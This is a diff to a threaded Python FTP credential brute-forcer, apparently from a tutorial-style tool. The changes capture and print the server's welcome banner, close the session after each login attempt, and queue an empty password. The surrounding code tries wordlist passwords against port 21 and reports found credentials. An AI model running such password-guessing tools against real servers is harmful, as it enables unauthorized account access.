@@ -6,11 +6,11 @@ import ftplib
 import socket
 import threading
 import queue
+# init the console for colors (for Windows)
 from colorama import Fore, init
 import concurrent.futures
 from concurrent.futures import ThreadPoolExecutor
 
-# init the console for colors (for Windows)
 
 # port of FTP
 port = 21
@@ -30,8 +30,10 @@ def connect_ftp(q,executor):
         try:
             # tries to connect to FTP server with a timeout of 5
             server.connect(host, port, timeout=5)    
+            welcome = server.getwelcome()
             # login using the credentials (user & password)
             server.login(user, password)
+            server.quit()
         except TimeoutError:
             # timeout error
             print("Timed out: " + "password: " + password)
@@ -45,7 +47,8 @@ def connect_ftp(q,executor):
             print(f"{Fore.GREEN}[+] Found credentials: ")
             print(f"\tHost: {host}")
             print(f"\tUser: {user}")
-            print(f"\tPassword: {password}{Fore.RESET}")
+            print(f"\tPassword: {password}")
+            print(f"\tWelcome messsage: {welcome}{Fore.RESET}")
             # we found the password, let's clear the queue
             threadLock.release()
             clear(q,executor)
@@ -101,7 +104,7 @@ if __name__ == "__main__":
     print("[+] Passwords to try:", len(passwords))
     
     q = queue.Queue()
-
+    q.put("")
     # put all passwords to the queue
     for password in passwords:
         q.put(password)
